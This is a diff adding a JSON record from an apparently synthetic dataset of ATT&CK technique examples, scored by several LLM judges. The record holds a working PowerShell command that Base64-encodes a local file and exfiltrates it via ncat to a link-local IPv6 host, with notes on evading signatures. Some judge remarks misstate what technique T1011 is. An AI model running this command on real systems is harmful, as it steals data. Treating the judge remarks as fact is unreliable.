@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
+  "explanation": "Exfiltrates to a link-local IPv6 address on the Wi-Fi interface, using a local wireless medium distinct from primary routed channels. Data remains Base64-encoded, aligning with T1011's use of other network media.",
+  "rationale_steps": [
+    "Target a link-local IPv6 address on Wi-Fi to ensure a distinct network path.",
+    "Send Base64 data to an uncommon high TCP port to avoid typical service signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-aa6947e1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses, correct variable assignments, proper string formatting, and valid command chaining.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network medium (IPv6), it's implementing technique T1011 (Exfiltration Over Other Network Medium) rather than the described T1136 (Create Account) technique, showing a fundamental mismatch between the command and the claimed MITRE technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:46:57.957854Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and valid Powershell syntax and external command arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, which is not the objective of MITRE ATT&CK T1011 (Establish Accounts); the explanation incorrectly attempts to link this exfiltration behavior to account establishment.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T08:47:06.743576Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with valid variable assignments, string formatting, balanced quotes/parentheses, and plausible ncat flags; IPv6 scope ID via %ifIndex is acceptable in PowerShell.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-reads a file and transmits it via ncat to a link-local IPv6 address on the Wi-Fi interface (achieving exfiltration as described), though mapping this to T1011 'other network medium' is somewhat debatable since it remains standard IP networking.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T08:47:38.179116Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
